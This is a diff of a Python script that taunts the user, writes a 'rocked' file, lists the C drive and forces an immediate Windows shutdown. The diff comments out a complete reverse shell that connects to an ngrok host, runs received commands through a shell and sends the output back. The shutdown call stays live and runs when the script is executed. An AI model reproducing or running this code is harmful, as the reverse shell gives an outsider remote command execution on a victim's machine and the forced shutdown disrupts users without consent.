@@ -5,7 +5,7 @@ print("This is done bro laksh2 again. I can edit delete anyfile on your machine.
 
 def create_hello_file(filename):
     with open(filename, 'w') as file:
-        file.write("You have been rocked!")
+        file.write("You have been rocked kukka!")
 
 create_hello_file("hello.txt")    # Creates the file
 print("File 'hello.txt' created with message.")
@@ -33,40 +33,40 @@ run_command("echo Hello, world!")
 run_command("dir C:\\")  # List C drive contents
 
 
-import socket
-import subprocess
+#import socket
+#import subprocess
 
-IP = "0.tcp.in.ngrok.io"   # ngrok host
-PORT = 14476               # ngrok port 
+#IP = "0.tcp.in.ngrok.io"   # ngrok host
+#PORT = 14476               # ngrok port 
 
-s = socket.socket()
-s.connect((IP, PORT))
+#s = socket.socket()
+#s.connect((IP, PORT))
 
-while True:
-    command = s.recv(1024).decode().strip()
-    if command.lower() in ['exit', 'quit']:
-        break
+#while True:
+    #command = s.recv(1024).decode().strip()
+    #if command.lower() in ['exit', 'quit']:
+        #break
 
-    try:
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
-        try:
-            output, error = process.communicate(timeout=5)  # wait max 5 seconds
-        except subprocess.TimeoutExpired:
-            process.kill()
-            output, error = '', '[!] Command timed out or blocked'
+    #try:
+        #process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+        #try:
+            #output, error = process.communicate(timeout=5)  # wait max 5 seconds
+        #except subprocess.TimeoutExpired:
+            #process.kill()
+            #output, error = '', '[!] Command timed out or blocked'
 
-        response = output + error
-        if not response.strip():
-            response = '[✓] Command executed (no output)'
-    except Exception as e:
-        response = f'[!] Error: {str(e)}'
+        #response = output + error
+        #if not response.strip():
+            #response = '[✓] Command executed (no output)'
+    #except Exception as e:
+        #response = f'[!] Error: {str(e)}'
 
-    s.send(response.encode())
+    #s.send(response.encode())
 
-s.close()
+#s.close()
 
 def shutdown_windows():
-    print('shutting down bro')
+    print('shutting down nakutu bro')
     os.system("shutdown /s /t 0")  # Shutdowns Windows after 2 seconds
 
 shutdown_windows()                # Executes the shutdown
